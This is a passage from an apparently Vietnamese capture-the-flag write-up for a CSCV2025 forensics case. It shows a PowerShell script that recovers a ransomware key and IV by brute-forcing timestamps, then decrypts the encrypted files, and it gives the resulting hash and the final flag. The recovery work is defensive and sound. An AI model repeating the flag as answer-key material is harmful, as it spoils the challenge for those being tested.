$foundIV  = $null
$foundT   = $null

Write-Host "Bat dau quet nguoc xuoi $TimeWindowSeconds giay tu moc thoi gian $($sample.LastWriteTimeUtc)..."

for ($t = $baseUnix - $TimeWindowSeconds; $t -le $baseUnix + $TimeWindowSeconds; $t++) {
    $derived = Derive-KeyIv -UnixTimeSeconds $t -ComputerName $ComputerName -UserName $UserName
    $key = $derived.Key
    $iv  = $derived.IV

    if (Test-KeyOnFile -FilePath $sample.FullName -Key $key -IV $iv) {
        Write-Host "`n[+] DA TIM THAY KEY HOP LE!" -ForegroundColor Green
        Write-Host "    UnixTime = $t"
        $dt = [DateTimeOffset]::FromUnixTimeSeconds($t).UtcDateTime
        Write-Host "    Thoi gian ma doc chay (UTC): $dt"
        $foundKey = $key
        $foundIV  = $iv
        $foundT   = $t
        break
    }
}

if (-not $foundKey) {
    Write-Error "Khong tim thay key nao hop le trong khoang thoi gian nay. Ban co the thu tang TimeWindowSeconds len."
    exit 1
}

Write-Host "`nBat dau tien hanh giai ma toan bo file..." -ForegroundColor Cyan

foreach ($f in $encFiles) {
    $relPath = $f.FullName.Substring($InputRoot.Length).TrimStart('\','/')
    if ($relPath.ToLower().EndsWith(".enc")) {
        $relPathOut = $relPath.Substring(0, $relPath.Length - 4)
    }
    else {
        $relPathOut = $relPath + ".dec"
    }

    $outPath = Join-Path $OutputRoot $relPathOut

    try {
        Decrypt-File -InputPath $f.FullName -OutputPath $outPath -Key $foundKey -IV $foundIV
        Write-Host "[OK]   $($f.Name)" -ForegroundColor Green
    }
    catch {
        Write-Warning "[FAIL] $($f.Name) : $($_.Exception.Message)"
    }
}

Write-Host "`n[!] HOAN TAT. Cac file da duoc giai ma nam trong: $OutputRoot" -ForegroundColor Yellow
```

Sau khi giải mã
![image](/images/cscv2025_final/58.png)

Đọc hash của file theo yêu cầu đề bài
![image](/images/cscv2025_final/59.png)
> 6982F297B52B3E6FA6946D3DF2EF810B6CD86E679511D2CC832D70953A4DD47F

Như vậy flag hoàn chỉnh là 
> CSCV2025{940ca4c4440ee72b2cc89e7927276b549be0d4dca7e7ae85ff7b25ecf52ced70_6982f297b52b3e6fa6946d3df2ef810b6cd86e679511d2cc832d70953a4dd47f}

## Case Beta
~~ lười r, to be continue